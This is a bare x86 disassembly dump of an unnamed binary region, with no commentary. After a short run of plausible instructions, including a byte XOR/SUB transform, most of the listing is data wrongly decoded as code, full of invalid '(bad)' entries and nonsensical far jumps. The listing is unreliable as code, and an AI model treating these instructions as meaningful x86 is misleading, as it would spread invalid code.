  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	or     eax,0x37dc8914
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x4082c7
  408275:	xchg   esp,eax
  408276:	ins    DWORD PTR es:[edi],dx
  408277:	push   esp
  408278:	les    esi,FWORD PTR [eax-0x77]
  40827b:	mov    cl,0xd6
  40827d:	push   edx
  40827e:	das    
  40827f:	imul   ebx,DWORD PTR [ecx+0x69],0xb
  408283:	out    dx,al
  408284:	scas   al,BYTE PTR es:[edi]
  408285:	cs pop ecx
  408287:	rcl    BYTE PTR [ebx+0x50],1
  40828a:	loop   0x4082c0
  40828c:	cs inc ebx
  40828e:	ficomp DWORD PTR [ecx+0x28]
  408291:	pop    es
  408292:	add    eax,0xc0c3d808
  408297:	push   ds
  408298:	mov    ch,0xc9
  40829a:	lods   eax,DWORD PTR ds:[esi]
  40829b:	and    eax,0x7a16d6ef
  4082a0:	inc    ebp
  4082a1:	inc    edi
  4082a2:	sub    bh,dh
  4082a4:	sbb    edi,DWORD PTR [ebx-0x5a]
  4082a7:	push   edx
  4082a8:	sbb    al,0x53
  4082aa:	mov    ecx,0x60f602f
  4082af:	imul   edi,DWORD PTR [bx+di],0x683463aa
  4082b6:	xor    ah,dl
  4082b8:	les    eax,FWORD PTR [esi+0x26c5d44f]
  4082be:	(bad)  
  4082bf:	bndstx [edx],bnd2
  4082c2:	or     edi,DWORD PTR [ecx]
  4082c4:	push   eax
  4082c5:	in     eax,0x86
  4082c7:	xlat   BYTE PTR ds:[ebx]
  4082c8:	lods   al,BYTE PTR ds:[esi]
  4082c9:	pop    ebx
  4082ca:	stc    
  4082cb:	sbb    eax,0x594e242d
  4082d0:	cmc    
  4082d1:	mov    ch,dl
  4082d3:	mov    ebp,0xb9ab6f26
  4082d8:	cdq    
  4082d9:	mov    esp,0xba67fe1b
  4082de:	jecxz  0x40828b
  4082e0:	nop
  4082e1:	pop    edx
  4082e2:	mov    edi,es
  4082e4:	push   0xffffffe1
  4082e6:	or     eax,0x5a0b8041
  4082eb:	fcmove st,st(7)
  4082ed:	das    
  4082ee:	pushf  
  4082ef:	in     al,dx
  4082f0:	cmp    edi,DWORD PTR [ebx]
  4082f2:	mul    DWORD PTR [eax]
  4082f4:	inc    ebx
  4082f5:	enter  0xcce6,0xcc
  4082f9:	push   esi
  4082fa:	push   ds
  4082fb:	adc    esi,ecx
  4082fd:	pusha  
  4082fe:	daa    
  4082ff:	outs   dx,BYTE PTR ds:[esi]
  408300:	adc    esi,edi
  408302:	and    ebp,DWORD PTR [edi-0x51fa044f]
  408308:	add    BYTE PTR [eax+0x59],bh
  40830b:	rcr    BYTE PTR [ecx+ebp*2-0x4e],cl
  40830f:	cwde   
  408310:	fs push edi
  408312:	cmc    
  408313:	inc    esp
  408314:	out    0x1f,al
  408316:	mul    BYTE PTR [ebx+edx*1+0x41e4c3cd]
  40831d:	ror    DWORD PTR [esi+0x48],cl
  408320:	jb     0x408340
  408322:	clc    
  408323:	sub    DWORD PTR [esi],esi
  408325:	mov    ch,0x2d
  408327:	fidiv  DWORD PTR [eax+ecx*4-0x2326a274]
  40832e:	xchg   ecx,eax
  40832f:	mov    bl,0x78
  408331:	adc    edi,edx
  408333:	fnstsw WORD PTR [eax-0x7be98222]
  408339:	cmp    BYTE PTR fs:[ebp-0x312c3cd4],0xab
  408341:	sbb    eax,0xa10d469
  408346:	sti    
  408347:	add    edx,eax
  408349:	aas    
  40834a:	cmp    BYTE PTR [edi],cl
  40834c:	ret    
  40834d:	fstp   DWORD PTR [esi+0x6a326a4e]
  408353:	ror    BYTE PTR [edi-0x3c1f60c4],1
  408359:	mov    edx,0xd6a41f08
  40835e:	xor    al,0x89
  408360:	repz xor al,0x6e
  408363:	std    
  408364:	adc    esi,edi
  408366:	cmp    esp,DWORD PTR [esp+eax*2+0x52]
  40836a:	outs   dx,DWORD PTR ds:[si]
  40836c:	dec    esi
  40836d:	jmp    0x6174:0xe70f202a
  408374:	fisub  DWORD PTR [edi]
  408376:	adc    edx,DWORD PTR [edi-0x79]
  408379:	gs xor eax,0x7ba1906f
  40837f:	jns    0x408338
  408381:	xchg   ebp,eax
  408382:	push   esi
  408383:	jmp    0x4083fd
  408385:	push   ss
  408386:	xchg   esp,eax
  408387:	idiv   BYTE PTR [ecx-0x74321486]
  40838d:	pop    ecx
  40838e:	dec    edx
  40838f:	into   
  408390:	or     esp,edi
  408392:	sahf   
  408393:	mov    ds:0x40069efd,al
  408398:	scas   al,BYTE PTR es:[edi]
  408399:	push   eax
  40839a:	mov    ebp,0x5cfbb463
  40839f:	jno    0x408350
  4083a1:	scas   eax,DWORD PTR es:[edi]
  4083a2:	retf   0xd924
  4083a5:	ins    DWORD PTR es:[edi],dx
  4083a6:	dec    ebp
  4083a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083a8:	push   ebx
  4083a9:	(bad)  
  4083aa:	mov    ebx,0x98920747
  4083af:	outs   dx,DWORD PTR ds:[esi]
  4083b0:	pushf  
  4083b1:	dec    BYTE PTR [ebx+0x7c]
  4083b4:	pop    ebx
  4083b5:	iret   
  4083b6:	mov    ch,0xd2
  4083b8:	push   ss
  4083b9:	dec    ebp
  4083ba:	test   dl,bh
  4083bc:	cli    
  4083bd:	dec    ebp
  4083be:	enter  0xea6d,0x6e
  4083c2:	imul   edi,esi,0x7
  4083c5:	sbb    esi,ecx
  4083c7:	and    al,0xf5
  4083c9:	jnp    0x40842d
  4083cb:	push   esp
  4083cc:	inc    BYTE PTR [ecx-0x6b]
  4083cf:	xchg   esp,eax
  4083d0:	or     al,0xb2
  4083d2:	ficomp WORD PTR [esi]
  4083d4:	pop    ebp
  4083d5:	dec    ecx
  4083d6:	dec    ecx
  4083d7:	fsubrp st(1),st
  4083d9:	pushf  
  4083da:	ins    BYTE PTR es:[edi],dx
  4083db:	(bad)  
  4083dc:	mov    al,0xbd
  4083de:	jge    0x408367
  4083e0:	pop    ebp
  4083e1:	inc    eax
  4083e2:	lock mov eax,ds:0x8883c614
  4083e8:	push   ebx
  4083e9:	jl     0x4083e3
  4083eb:	dec    ebx
  4083ec:	sub    ebx,DWORD PTR [esi+esi*8-0x3f]
  4083f0:	ja     0x408449
  4083f2:	push   0xffffffbc
  4083f4:	jecxz  0x4083f5
  4083f6:	test   al,0xc4
  4083f8:	mov    ebp,0x5c0169ed
  4083fd:	mov    BYTE PTR [edx-0x1e341a92],0xf2
  408404:	aas    
  408405:	and    BYTE PTR [edi+0x32],ch
  408408:	mov    ecx,0x120d1449
  40840d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40840e:	das    
  40840f:	pop    ss
  408410:	xchg   ebx,eax
  408411:	call   0x562d:0x937da6ff
  408418:	call   0x84081528
  40841d:	push   ds
  40841e:	xor    al,0x8b
  408420:	pop    ebx
  408421:	cmp    cl,BYTE PTR [ebx+0x3209b2e5]
  408427:	int3   
  408428:	sub    edi,eax
  40842a:	sahf   
  40842b:	sbb    al,BYTE PTR [ebx-0x1a98857e]
  408431:	scas   eax,DWORD PTR es:[edi]
  408432:	push   esp
  408433:	xor    ah,BYTE PTR [edx-0x6e]
  408436:	mov    ecx,0xa0afce57
  40843b:	mov    esp,0xf34047ef
  408440:	stos   DWORD PTR es:[edi],eax
  408441:	mov    eax,ds:0xa1aac1df
  408446:	das    
  408447:	rol    dl,cl
  408449:	stc    
  40844a:	push   es
  40844b:	sti    
  40844c:	adc    DWORD PTR [esi-0xce6bb50],ecx
  408452:	iret   
  408453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408454:	in     al,dx
  408455:	push   0xffffff98
  408457:	ins    BYTE PTR es:[edi],dx
  408458:	lods   eax,DWORD PTR ds:[esi]
  408459:	retf   0x45f8
  40845c:	or     al,dl
  40845e:	aaa    
  40845f:	into   
  408460:	mov    esp,0x15b4e704
  408465:	(bad)  
  408466:	mov    eax,0xf75e049b
  40846b:	xchg   edi,eax
  40846c:	sbb    bh,BYTE PTR [ebp+0x12ad55d4]
  408472:	pop    esp
  408473:	mov    eax,ds:0x903ed6e7
  408478:	cmp    ebp,DWORD PTR [esi]
  40847a:	(bad)
  40847d:	fwait
  40847e:	dec    ebp
  40847f:	pop    es
  408480:	js     0x4084eb
  408482:	cmp    DWORD PTR [edi+0x788aa52d],edx
  408488:	sbb    eax,DWORD PTR [edx+eiz*4-0x2459817e]
  40848f:	or     DWORD PTR [edi-0x7a2b5c38],esi
  408495:	cmp    eax,0x28eaffaa
  40849a:	sub    esp,DWORD PTR [edx+edi*4]
  40849d:	outs   dx,BYTE PTR ds:[esi]
  40849e:	jae    0x40844e
  4084a0:	or     BYTE PTR [esi-0x60e486cb],al
  4084a6:	inc    esi
  4084a7:	shl    DWORD PTR ds:0x7910fa2b,cl
  4084ad:	es out 0xc4,al
  4084b0:	mov    edx,0x515e0bba
  4084b5:	adc    DWORD PTR [ebp+0x70],eax
  4084b8:	push   ecx
  4084b9:	jmp    0x8dc6cdcd
  4084be:	mov    ebp,0x2929bb52
  4084c3:	mov    bh,0xbe
  4084c5:	sub    DWORD PTR [eax],ebp
  4084c7:	cmp    esi,DWORD PTR [eax]
  4084c9:	daa    
  4084ca:	ja     0x4084de
  4084cc:	retf   
  4084cd:	mov    edi,0xe67c248f
  4084d2:	jno    0x4084cb
  4084d4:	pop    edx
  4084d5:	xor    eax,0xd7fdb735
  4084da:	pop    edx
  4084db:	add    al,0x3f
  4084dd:	mov    bh,0x3
  4084df:	add    dl,0xd
  4084e2:	mov    ebp,0x7e23adfd
  4084e7:	mov    ebx,0x2e905584
  4084ec:	mov    ds:0xe5559ce7,al
  4084f1:	dec    esp
  4084f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084f3:	xchg   edi,eax
  4084f4:	or     ebx,DWORD PTR [ebx-0x209667ac]
  4084fa:	xor    edi,DWORD PTR [ebp*8+0x4df57f6a]
  408501:	mov    ch,0x17
  408503:	sbb    eax,0x2ae87dcd
  408508:	add    al,0xa3
  40850a:	jge    0x4084f8
  40850c:	ret    
  40850d:	les    ebx,FWORD PTR [eax]
  40850f:	xchg   ebx,eax
  408510:	ds cmp al,0xfd
  408513:	ja     0x408517
  408515:	retf   0x997
  408518:	xor    eax,0x2fed4c3d
  40851d:	jecxz  0x40859d
  40851f:	push   edi
  408520:	shr    BYTE PTR [esi-0x533ffc41],1
  408526:	cdq    
  408527:	retf   
  408528:	xchg   esp,eax
  408529:	aad    0xbf
  40852b:	fnstenv [ecx+0x60a1594e]
  408531:	fnstsw WORD PTR [edi]
  408533:	hlt    
  408534:	push   ebx
  408535:	call   0x6614:0xe6f55bdb
  40853c:	add    ch,BYTE PTR [esi+edi*1+0x45]
  408540:	cmp    DWORD PTR [edx-0x17742367],edx
  408546:	ins    DWORD PTR es:[edi],dx
  408547:	iret   
  408548:	push   0xd1065a8e
  40854d:	in     al,0xc4
  40854f:	sahf   
  408550:	or     DWORD PTR [ebp+0x44abb534],0xffffff9f
  408557:	shl    DWORD PTR [edx-0x65],1
  40855a:	mov    al,0x66
  40855c:	(bad)  [ecx+0x4b]
  40855f:	pop    ss
  408560:	mov    bh,0xbb
  408562:	daa    
  408563:	and    DWORD PTR [ebp-0x32ac0ee5],edx
  408569:	or     BYTE PTR [ebx],dl
  40856b:	xlat   BYTE PTR ds:[ebx]
  40856c:	and    al,0x2c
  40856e:	scas   eax,DWORD PTR es:[edi]
  40856f:	add    eax,0xe5d5491
  408574:	lahf   
  408575:	jmp    0xff5e:0xaf431ff1
  40857c:	adc    eax,0x3a86284
  408581:	dec    eax
  408582:	data16 ins BYTE PTR es:[edi],dx
  408584:	mov    dl,0x91
  408586:	cmp    DWORD PTR [ebx+0x10],0xfffffff5
  40858a:	pop    ebp
  40858b:	mov    dl,0x4b
  40858d:	cli    
  40858e:	lds    ecx,FWORD PTR [ebx]
  408590:	jne    0x408550
  408592:	idiv   DWORD PTR [esi]
  408594:	xor    eax,ebx
  408596:	xchg   ecx,eax
  408597:	(bad)  [esi-0x73]
  40859a:	sbb    eax,DWORD PTR [esi+0x79b43dc2]
  4085a0:	push   ss
  4085a1:	and    BYTE PTR [edx+ebx*1],0x88
  4085a5:	add    ecx,ebp
  4085a7:	dec    eax
  4085a8:	add    eax,DWORD PTR [eax]
  4085aa:	add    BYTE PTR [edi-0x6],al
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0x2f0afc40
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x4085c4
  4085c4:	inc    ebx
  4085c5:	jne    0x408641
  4085c7:	mov    ds:0x9cea1eca,al
  4085cc:	scas   al,BYTE PTR es:[edi]
  4085cd:	shl    BYTE PTR [ebp+0x5d687f8],cl
  4085d3:	cld    
  4085d4:	jbe    0x408569
  4085d6:	fcom   DWORD PTR [edx]
  4085d8:	pop    esp
  4085d9:	mov    ah,0xe5
  4085db:	inc    ebp
  4085dc:	outs   dx,DWORD PTR ds:[esi]
  4085dd:	bound  edi,QWORD PTR [ebx+0x6e]
  4085e0:	jno    0x4085f5
  4085e2:	jns    0x408634
  4085e4:	pop    ebp
  4085e5:	popa   
  4085e6:	adc    eax,0x80fe47bc
  4085eb:	mov    dh,0xf3
  4085ed:	inc    edi
  4085ee:	jne    0x408601
  4085f0:	jns    0x4085a6
  4085f2:	sbb    esi,0x3cfe7648
  4085f8:	out    dx,eax
  4085f9:	(bad)  
  4085fa:	jg     0x4085c9
  4085fc:	cdq    
  4085fd:	mov    bl,0x27
  4085ff:	(bad)  
  408600:	clc    
  408601:	icebp  
  408602:	jl     0x4085a9
  408604:	or     edi,DWORD PTR [eax-0x11]
  408607:	adc    dh,BYTE PTR [ecx-0x56]
  40860a:	aam    0x4e
  40860c:	jne    0x408632
  40860e:	push   cs
  40860f:	sahf   
  408610:	dec    ecx
  408611:	mov    eax,0xc5ba0184
  408616:	sub    BYTE PTR [esi+0x688ee3c],cl
  40861c:	test   BYTE PTR [esi],dl
  40861e:	(bad)  
  40861f:	(bad)  
  408620:	aam    0xf4
  408622:	cmp    edx,DWORD PTR [ebx]
  408624:	add    eax,DWORD PTR [ebp+0x71b4610d]
  40862a:	dec    esp
  40862b:	add    DWORD PTR [ebx+0x63],0x6b
  40862f:	adc    al,0x89
  408631:	mov    ebp,0x57c6e50c
  408636:	add    al,0x6b
  408638:	test   BYTE PTR [edi+0x3f00e640],ah
  40863e:	test   edi,edi
  408640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408641:	and    DWORD PTR [esi-0xc88daeb],edi
  408647:	int    0x96
  408649:	js     0x4085d1
  40864b:	mov    esi,0xa34281da
  408650:	jmp    0x4085fe
  408652:	lea    eax,[eax+0x74]
  408655:	xchg   ebp,eax
  408656:	inc    esi
  408657:	inc    edi
  408658:	sbb    eax,0x77be1cfc
  40865d:	sbb    ch,ah
  40865f:	sbb    ch,BYTE PTR [ecx-0x5c2f2231]
  408665:	inc    al
  408667:	sahf   
  408668:	dec    eax
  408669:	shl    esp,1
  40866b:	jb     0x4086eb
  40866d:	dec    ecx
  40866e:	push   eax
  40866f:	xor    ah,ch
  408671:	push   ebx
  408672:	aam    0xb8
  408674:	pop    eax
  408675:	jno    0x4086cb
  408677:	pushf  
  408678:	test   eax,0x2717a5d0
  40867d:	dec    ecx
  40867e:	and    al,0xfe
  408680:	xchg   esp,eax
  408681:	cmp    BYTE PTR [ecx+0x25e63b82],bh
  408687:	ins    BYTE PTR es:[edi],dx
  408688:	es mov bh,0x8a
  40868b:	cmp    al,BYTE PTR [ebp+0x65]
  40868e:	ficom  DWORD PTR [edi]
  408690:	dec    ebx
  408691:	push   ecx
  408692:	push   es
  408693:	cmp    ecx,ebx
  408695:	into   
  408696:	xchg   ebp,eax
  408697:	pop    ecx
  408698:	mov    ch,0x9c
  40869a:	popa   
  40869b:	in     eax,0x33
  40869d:	pop    edx
  40869e:	push   ds
  40869f:	inc    edi
  4086a0:	inc    ebp
  4086a1:	bound  ecx,QWORD PTR es:[edx+0x4f]
  4086a5:	lea    ebx,[esi-0x686b58b]
  4086ab:	adc    cl,ch
  4086ad:	pop    eax
  4086ae:	pop    esi
  4086af:	mov    ss,WORD PTR [esi]
  4086b1:	div    BYTE PTR [edx+0x4f]
  4086b4:	in     eax,dx
  4086b5:	pusha  
  4086b6:	xlat   BYTE PTR ds:[ebx]
  4086b7:	in     al,dx
  4086b8:	ss xchg al,dh
  4086bb:	sbb    edx,edx
  4086bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086be:	cld    
  4086bf:	fsub   QWORD PTR [ecx+0x75]
  4086c2:	call   0x19d23c68
  4086c7:	jns    0x408724
  4086c9:	gs sti 
  4086cb:	fld    st(6)
  4086cd:	pusha  
  4086ce:	cmp    ecx,ecx
  4086d0:	jge    0x4086ea
  4086d2:	mov    eax,ds:0x5471f7b4
  4086d7:	adc    dl,BYTE PTR [esi-0x3c]
  4086da:	add    eax,0xb968d2eb
  4086df:	scas   al,BYTE PTR es:[edi]
  4086e0:	(bad)  
  4086e1:	mov    ecx,0xef4014c9
  4086e6:	cmp    esp,DWORD PTR [ecx+0xf]
  4086e9:	imul   esp,DWORD PTR [eax],0xd7415f64
  4086ef:	sub    DWORD PTR [ecx],ebx
  4086f1:	imul   sp,sp,0x52
  4086f5:	ins    BYTE PTR es:[edi],dx
  4086f6:	aaa    
  4086f7:	inc    esi
  4086f8:	sbb    ebx,DWORD PTR [ecx]
  4086fa:	in     eax,0x1e
  4086fc:	call   0xc2eb:0xa1792465
  408703:	cmp    al,0xdf
  408705:	int    0x3d
  408707:	sub    edx,DWORD PTR [edi-0x80]
  40870a:	mov    eax,ds:0xa8af6db3
  40870f:	mov    edi,0xbb8f7642
  408714:	xor    sp,WORD PTR [esi]
  408717:	mov    ch,0x87
  408719:	pop    esp
  40871a:	fs jecxz 0x40873f
  40871d:	mov    ebx,0xc16f8777
  408722:	push   0x2c
  408724:	dec    ch
  408726:	in     al,dx
  408727:	xchg   al,al
  408729:	pinsrw mm5,edx,0x7d
  40872d:	les    edi,FWORD PTR [esi-0x5c]
  408730:	or     esp,ecx
  408732:	ret    0xbeee
  408735:	retf   
  408736:	nop
  408737:	cwde   
  408738:	clc    
  408739:	adc    al,0x16
  40873b:	pop    es
  40873c:	dec    ecx
  40873d:	and    BYTE PTR [edi-0x4f],0x7c
  408741:	pop    ds
  408742:	cmp    DWORD PTR [ecx-0x1f474a6],edx
  408748:	(bad)  
  408749:	sbb    dl,bl
  40874b:	sti    
  40874c:	clc    
  40874d:	call   0xccf3da61
  408752:	mov    ?,WORD PTR [ecx]
  408754:	mov    cl,0x26
  408756:	sub    DWORD PTR [ecx-0x36],ecx
  408759:	or     BYTE PTR [ecx-0x77],bh
  40875c:	idiv   BYTE PTR [edx]
  40875e:	jecxz  0x408709
  408760:	stos   DWORD PTR es:[edi],eax
  408761:	addr16 lahf 
  408763:	mov    edx,0x856c5f5
  408768:	and    al,0x32
  40876a:	pop    esp
  40876b:	cmp    al,0x35
  40876d:	inc    edx
  40876e:	cmp    esp,DWORD PTR [eax-0x3d8704d6]
  408774:	mov    eax,0x4fe1d6e3
  408779:	neg    BYTE PTR [ebx]
  40877b:	sub    dl,BYTE PTR [esi-0x563cabd4]
  408781:	jge    0x4087ed
  408783:	mov    WORD PTR [edx-0x5d],cs
  408786:	push   0xffffffdf
  408788:	jne    0x408794
  40878a:	add    BYTE PTR [esp+edx*4],al
  40878d:	cli    
  40878e:	jmp    0x82fd:0x72f23087
  408795:	inc    ecx
  408796:	add    eax,0x5d9bd833
  40879b:	bound  ecx,QWORD PTR [esi]
  40879d:	in     al,0x96
  40879f:	mov    DWORD PTR [edx],esp
  4087a1:	jge    0x408767
  4087a3:	(bad)  
  4087a4:	and    esi,esi
  4087a6:	push   edx
  4087a7:	imul   ebp,ecx,0x29b48b87
  4087ad:	xor    BYTE PTR [ecx+0x3c],ah
  4087b0:	jecxz  0x4087f0
  4087b2:	mov    ds:0xbb3e2519,eax
  4087b7:	or     al,BYTE PTR [ebp-0x6ff82b9f]
  4087bd:	or     DWORD PTR [edx+ecx*8+0x60f01d47],esp
  4087c4:	loope  0x40876a
  4087c6:	fadd   QWORD PTR [esi+0x2cdee35d]
  4087cc:	nop
  4087cd:	adc    al,0x29
  4087cf:	sub    BYTE PTR [esi+0x2b],cl
  4087d2:	jmp    0x6300ea43
  4087d7:	fwait
  4087d8:	test   eax,0x5addbad1
  4087dd:	mov    ecx,0x2def8f52
  4087e2:	cld    
  4087e3:	cmp    BYTE PTR [eax+0x2909e56d],0x30
  4087ea:	add    al,0x65
  4087ec:	add    ecx,DWORD PTR [ecx+eiz*2]
  4087ef:	pop    es
  4087f0:	out    dx,eax
  4087f1:	neg    esi
  4087f3:	jmp    0x4087ea
  4087f5:	test   bh,dl
  4087f7:	mov    edi,0x71e99c3a
  4087fc:	enter  0xc10c,0x5e
  408800:	mov    ah,0xdf
  408802:	sbb    dh,bh
  408804:	add    al,0x59
  408806:	xor    esi,DWORD PTR [ebp-0x72]
  408809:	mov    BYTE PTR [ebx-0x38584a7],ch
  40880f:	daa    
  408810:	adc    al,0x8b
  408812:	jl     0x4087e1
  408814:	and    esp,DWORD PTR [ecx]
  408816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408817:	mov    ds:0xb577bd2a,al
  40881c:	es iret 
  40881e:	push   ss
  40881f:	push   ecx
  408820:	popf   
  408821:	or     al,0x9
  408823:	jmp    0x4087cd
  408825:	std    
  408826:	fild   QWORD PTR [eax+0x6f849668]
  40882c:	pop    ds
  40882d:	mov    ebp,0xa232a8c5
  408832:	scas   al,BYTE PTR es:[edi]
  408833:	add    DWORD PTR [edi-0x4ec5f342],ebp
  408839:	adc    DWORD PTR [edx-0x79],eax
  40883c:	mov    al,0x2a
  40883e:	push   esp
  40883f:	bound  esi,QWORD PTR [esp+esi*8-0x3fc4d524]
  408846:	fimul  DWORD PTR ds:0x94a7bb8e
  40884c:	add    DWORD PTR [ecx-0x50],ebp
  40884f:	repz dec esp
  408851:	out    0xd2,al
  408853:	inc    ecx
  408854:	sahf   
  408855:	stos   DWORD PTR es:[edi],eax
  408856:	lock js 0x4088d6
  408859:	rol    BYTE PTR [eax],cl
  40885b:	stos   DWORD PTR es:[edi],eax
  40885c:	mov    ebx,0x9ba4c85
  408861:	adc    BYTE PTR [ebp-0x387afdce],dh
  408867:	xchg   ecx,eax
  408868:	adc    DWORD PTR [esi],ebx
  40886a:	ret    
  40886b:	mov    edi,ebx
  40886d:	ret    0xb6c0
  408870:	sub    BYTE PTR [esi+0x5151430a],bh
  408876:	xchg   edi,eax
  408877:	push   esp
  408878:	xchg   esi,eax
  408879:	cmp    DWORD PTR [ebp-0x27d58037],edi
  40887f:	mov    ebp,eax
  408881:	or     bl,BYTE PTR [ecx-0x80]
  408884:	bound  edi,QWORD PTR [ebx]
  408886:	mov    ebp,0xdb20ba2a
  40888b:	dec    bl
  40888d:	jne    0x408906
  40888f:	fld    QWORD PTR [esi-0x48]
  408892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408893:	and    edx,DWORD PTR [edx+0x5d]
  408896:	(bad)  
  408897:	js     0x4088bf
  408899:	sub    eax,0xd1cbaacd
  40889e:	add    BYTE PTR [edx+0x13785359],al
  4088a4:	sar    eax,cl
  4088a6:	scas   al,BYTE PTR es:[edi]
  4088a7:	shr    al,1
  4088a9:	xor    DWORD PTR [ebp+0x3f99886f],eax
  4088af:	adc    bh,BYTE PTR [esi+0x6abb50c9]
  4088b5:	fwait
  4088b6:	pusha  
  4088b7:	sbb    DWORD PTR [ebx+0x1e],esp
  4088ba:	mov    ?,WORD PTR [edx-0x6f44f1ba]
  4088c0:	(bad)  
  4088c1:	repz and eax,0x5509107d
  4088c7:	cmp    DWORD PTR [ebx+0x1cb41538],esp
  4088cd:	(bad)  
  4088cf:	pop    eax
  4088d0:	or     DWORD PTR [ebx-0x314f989],0xb59d0583
  4088da:	dec    edi
  4088db:	ds mov ah,0x4b
  4088de:	sbb    cl,BYTE PTR [esp+eiz*4-0x1f]
  4088e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088e3:	inc    ebp
  4088e4:	mov    bl,0xbf
  4088e6:	arpl   bx,sp
  4088e8:	bound  ebx,QWORD PTR [eax+0x5acddb66]
  4088ee:	mov    ch,0x38
  4088f0:	std    
  4088f1:	iret   
  4088f2:	lods   eax,DWORD PTR ds:[esi]
  4088f3:	lea    eax,[ebp-0x8]
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp-0x29bca301],cl
  40890c:	sbb    DWORD PTR ds:0x70dc97d6,ebp
  408912:	jo     0x408934
  408914:	jge    0x408986
  408916:	jo     0x40897c
  408918:	mov    edi,0x5912c96a
  40891d:	je     0x40895e
  40891f:	push   edx
  408920:	sbb    eax,0x5dfc8bcf
  408925:	mov    eax,ds:0xac112e7d
  40892a:	fst    DWORD PTR [ebx]
  40892c:	cmp    eax,0x8cb6fbbf
  408931:	pop    es
  408932:	jne    0x408964
  408934:	mov    dl,0xcf
  408936:	xlat   BYTE PTR ds:[ebx]
  408937:	js     0x40891a
  408939:	loopne 0x4089ad
  40893b:	mov    edi,0xc603ebe3
  408940:	test   al,0xc4
  408942:	pop    eax
  408943:	sbb    eax,0x8c5e7617
  408948:	arpl   WORD PTR [ebp+0x54],di
  40894b:	ror    BYTE PTR [ecx-0xe],1
  40894e:	sti    
  40894f:	add    bh,BYTE PTR ss:[esi]
  408952:	loop   0x4089c0
  408954:	ficom  WORD PTR [ebp-0x193add34]
  40895a:	mov    eax,ds:0xbd02f8c3
  40895f:	fdivr  st(1),st
  408961:	pop    es
  408962:	adc    bl,BYTE PTR [edx]
  408964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408965:	ret    
  408966:	pushf  
  408967:	jge    0x408929
  408969:	gs jae 0x408946
  40896c:	inc    edx
  40896d:	push   edi
  40896e:	or     DWORD PTR [ecx],ebp
  408970:	ja     0x4089a8
  408972:	dec    edi
  408973:	xchg   ebp,eax
  408974:	outs   dx,BYTE PTR ds:[esi]
  408975:	jp     0x40890f
  408977:	cmc    
  408978:	push   esi
  408979:	pop    es
  40897a:	sub    ebp,DWORD PTR [edx+esi*8+0x16bbb030]
  408981:	(bad)  
  408982:	leave  
  408983:	or     eax,0x77bf9f12
  408988:	xchg   edx,eax
  408989:	int3   
  40898a:	or     DWORD PTR [ebp-0x20866f1e],esi
  408990:	clc    
  408991:	mov    edi,esp
  408993:	sar    DWORD PTR [edi],1
  408995:	fild   DWORD PTR [ecx-0xb91a326]
  40899b:	and    ch,al
  40899d:	scas   eax,DWORD PTR es:[edi]
  40899e:	push   eax
  40899f:	and    DWORD PTR [edx+0x37],ecx
  4089a2:	adc    dl,BYTE PTR [ecx]
  4089a4:	sbb    eax,0x81bf60ee
  4089a9:	and    esi,esi
  4089ab:	jle    0x408a20
  4089ad:	add    al,0xf5
  4089af:	or     esp,DWORD PTR [ebx-0x43]
  4089b2:	push   0xffffffb5
  4089b4:	cli    
  4089b5:	jg     0x4089e5
  4089b7:	fmul   QWORD PTR [edi+0x63a13524]
  4089bd:	mov    edi,0x7d44b170
  4089c2:	mov    eax,0x1b18d69c
  4089c7:	mov    dh,0x41
  4089c9:	mov    esi,0xa84cdc3a
  4089ce:	in     al,dx
  4089cf:	dec    esp
  4089d0:	inc    edi
  4089d1:	sub    BYTE PTR [edi+0x732048fd],bh
  4089d7:	cvtps2pd xmm1,xmm6
  4089da:	pop    eax
  4089db:	push   DWORD PTR [edi]
  4089dd:	jne    0x408a5c
  4089df:	jns    0x408a27
  4089e1:	loopne 0x4089f2
  4089e3:	lock lock push esp
  4089e6:	mov    edx,0xd80f6e59
  4089eb:	(bad)  
  4089ed:	add    cl,ah
  4089ef:	into   
  4089f0:	fcom   QWORD PTR [ecx]
  4089f2:	inc    ecx
  4089f3:	jle    0x408a61
  4089f5:	xor    ebp,DWORD PTR [ebx+edi*8+0x56eb54ad]
  4089fc:	mov    bl,0x9d
  4089fe:	loope  0x4089c6
  408a00:	mov    cl,0xd4
  408a02:	and    al,0x8e
  408a04:	test   DWORD PTR [edx-0x35],esp
  408a07:	les    edx,FWORD PTR [eax-0x13f93a3]
  408a0d:	adc    eax,0x76ad7c6c
  408a12:	push   edx
  408a13:	std    
  408a14:	jo     0x408a6c
  408a16:	jle    0x4089e4
  408a18:	into   
  408a19:	int    0xb9
  408a1b:	dec    ebx
  408a1c:	lahf   
  408a1d:	outs   dx,BYTE PTR ds:[esi]
  408a1e:	add    DWORD PTR [esp+edi*2+0x42],0xb181c26
  408a26:	xor    eax,DWORD PTR [edx]
  408a28:	push   ds
  408a29:	xchg   ecx,eax
  408a2a:	inc    ebx
  408a2b:	sub    BYTE PTR [esi-0x39],al
